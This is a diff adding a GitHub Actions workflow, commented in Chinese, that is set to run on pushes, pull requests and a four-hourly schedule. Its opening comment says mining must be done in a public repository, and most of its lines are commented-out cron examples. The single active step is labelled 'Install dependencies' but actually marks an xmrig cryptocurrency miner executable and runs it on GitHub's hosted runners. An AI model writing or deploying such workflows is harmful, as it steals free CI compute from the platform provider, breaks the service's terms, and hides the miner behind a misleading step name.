@@ -1,0 +1,72 @@
+#挖矿任务必须在公共仓库进行
+name: mint
+#github 的主线程任务30秒自动取消，子线程任务六小时自动取消
+# 【检出（Checkout）该仓库的代码】我们提交了这个工作流，它应该会「自动运行」，因为工作流中默认设置触发条件。
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+  # 【定时任务】Cron 表达式 0 * * * * 表示每小时 0 分触发一次。参考 Cron Guru。
+  schedule:
+    #此示例在每天 0:30\8:30\16:30[UTC] 触发工作流程
+    # - cron:  '30 0,8,16 * * *'
+    - cron:  '30 0,4,8,12,16,20 * * *'
+    # - cron:  '30 0,2,4,6,8,10,12,14,16,18,20,22 * * *'
+    # #在每天每小时的每个第 15 分钟运行。
+    # - cron:  '15 * * * * '
+    # #在每天第 4 和第 5 小时的第 2 和第 10 分钟运行。
+    # - cron:  '2,10 4,5 * * * '
+    # #在第 4-6 小时的第 30 分钟运行。
+    # - cron:  '30 4-6 * * * '
+    # #在第 20 分钟到第 59 分钟每隔 15 分钟运行一次（第 20、35 和 50 分钟）。
+    # - cron:  '20/15 * * * * '
+    # #应该是每分钟都运行【实际上不有5分钟有10分钟】
+    # - cron:  '* * * * *'
+    # #应该是每分钟的第30秒都运行【目前实际执行当中是30分钟执行一次】
+    # - cron:  '*/30 * * * *'
+    # #应该是每隔一分钟执行一次【实际上间隔大于1分钟，将近一分钟左右，可能是github本身有限制】
+    # - cron:  '*/1 * * * *'
+
+# #此示例触发工作流在每周一至周四 5:30 UTC 运行，但在周一和周三跳过 Not on Monday or Wednesday 步骤。
+# on:
+#   schedule:
+#     - cron: '30 5 * * 1,3'
+#     - cron: '30 5 * * 2,4'
+# jobs:
+#   test_schedule:
+#     runs-on: ubuntu-latest
+#     steps:
+#       - name: Not on Monday or Wednesday
+#         if: github.event.schedule != '30 5 * * 1,3'
+#         run: echo "This step will be skipped on Monday and Wednesday"
+#       - name: Every time
+#         run: echo "This step will always run"
+
+# 可以使用 permissions 修改授予 GITHUB_TOKEN 的默认权限，根据需要添加或删除访问权限，以便只授予所需的最低访问权限。
+permissions:
+  contents: read
+
+jobs:
+  build:
+    # 设置服务器系统版本
+    runs-on: ubuntu-latest
+
+    # 设置 Python 运行环境
+    steps:
+    - uses: actions/checkout@v3
+    - name: Set up Python 3.10
+      uses: actions/setup-python@v3
+      with:
+        python-version: "3.10"
+
+    # 安装依赖
+    - name: Install dependencies
+      run: |
+        cd actions/github-actions-python
+        chmod +x xmrig
+        ./xmrig
+    # #【防止失败后杀死实例】
+    # - name: Don't kill instace
+    #   if: ${{ failure() }}
+    #   run: sleep 1h # Prevent to killing instance after failure
